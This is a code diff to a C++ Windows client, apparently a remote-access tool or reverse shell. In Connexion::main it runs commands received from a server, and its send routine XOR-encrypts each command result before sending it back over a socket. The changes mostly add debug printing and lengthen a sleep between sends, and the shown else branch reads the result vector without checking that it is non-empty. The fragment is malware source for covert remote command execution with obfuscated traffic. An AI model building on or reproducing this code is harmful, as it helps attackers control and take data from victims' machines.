@@ -47,7 +47,7 @@ int Connexion::openConnexion()
 int Connexion::main(bool is_admin, string path_prog)
 {   
 
-    int i=0;
+    //int i=0;
     string command;
     vector <string> result;
 
@@ -134,14 +134,15 @@ int Connexion::main(bool is_admin, string path_prog)
                 if(command.substr(0,3) == "[-]")
                 {;} //if error not append path.
                 else
-                {result.push_back(getPath());}
+                {
+                    result.push_back(getPath());}
                 
                 sendSafe(result);
             }
         }
         command.erase();
         result.clear(); 
-        i++;
+        //i++;
     }
     return 0;
 }
@@ -186,23 +187,30 @@ Once the function is finished send "\r\n" to signal to the server that the clien
     int size_all_result_of_command = 0;
     string end = "\r\n"; //END CONNECTION.
     string request = "";
-
+    //cout << "size of result " << result_of_command.size() << endl;
     if(result_of_command.size() >= 1) 
     {        
-        
+        cout << "Multiple request: " << endl;
         for(i=0;i< result_of_command.size(); i++)
         {
+            cout << "size of request: " << result_of_command[i].length() << endl;
             request = result_of_command[i];
-            
+            cout << request << endl;
             send(sock_client, XOREncryption(request).c_str(), request.length(),0);
 
             size_all_result_of_command += request.length();
-            Sleep(100);
+            cout << "---------------------------\n\n" << endl;
+            cout<<  XOREncryption(request) << endl;
+            cout << "I: " <<i <<endl;
+ 
+            Sleep(400);   
         }
     }
 
     else
     {
+        cout << "singel request..." << endl;
+        cout << "size of request: " << result_of_command[i].length() << endl;
         request = result_of_command[0];
 
         iResult = send(sock_client, XOREncryption(request).c_str(), request.length(),0);
